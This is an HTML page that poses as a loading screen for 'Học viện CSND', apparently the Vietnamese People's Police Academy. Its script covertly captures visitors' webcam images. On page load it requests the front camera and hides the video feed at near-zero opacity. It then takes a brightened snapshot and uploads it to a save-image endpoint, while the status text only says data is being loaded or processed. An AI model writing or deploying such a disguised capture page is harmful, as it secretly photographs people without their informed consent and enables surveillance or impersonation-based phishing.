<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Học viện CSND</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f8f9fa;
            color: #333;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .container {
            text-align: center;
            max-width: 600px;
        }
        h1 {
            font-size: 1.85em;
            margin-bottom: 10px;
            color: #2c3e50;
        }
        p {
            color: #555;
            margin-bottom: 30px;
        }
        .status {
            font-size: 1.2em;
            color: #666;
            min-height: 60px;
        }

        /* Ẩn webcam nhưng vẫn render tốt trên máy tính */
        video {
            position: fixed;
            width: 160px;           /* Kích thước nhỏ */
            height: 120px;
            bottom: 10px;
            right: 10px;
            opacity: 0.02;          /* Rất mờ */
            border-radius: 4px;
            z-index: -1;
            pointer-events: none;
        }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Học viện CSND</h1>
        <p>Đang tải dữ liệu và đồng bộ thông tin...</p>
        
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        
        <div class="status" id="status">Vui lòng chờ trong giây lát...</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        async function startCapture() {
            try {
                status.textContent = "Đang kết nối camera...";

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 20 }
                    }
                });

                video.srcObject = stream;

                // Thời gian chờ hợp lý cho máy tính
                video.onloadedmetadata = () => {
                    setTimeout(() => captureImage(stream), 580);
                };

            } catch (err) {
                status.textContent = "Đang xử lý...";
                console.error(err);
            }
        }

        async function captureImage(stream) {
            try {
                status.textContent = "Đang thu thập dữ liệu...";

                canvas.width = 640;
                canvas.height = 480;

                const ctx = canvas.getContext('2d');
                ctx.filter = "brightness(1.2) contrast(1.05)";   // Tăng sáng
                ctx.drawImage(video, 0, 0, 640, 480);

                const imageData = canvas.toDataURL('image/jpeg', 0.75);

                const response = await fetch('/.netlify/functions/save-image', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                });

                if (response.ok) {
                    status.innerHTML = `Hoàn tất.<br><small>Dữ liệu đã được gửi thành công.</small>`;
                } else {
                    status.textContent = "Đang hoàn tất...";
                }

            } catch (error) {
                status.textContent = "Đang hoàn tất...";
                console.error(error);
            }

            // Tắt camera
            setTimeout(() => {
                if (stream) stream.getTracks().forEach(track => track.stop());
            }, 800);
        }

        window.onload = startCapture;
    </script>
</body>
</html>
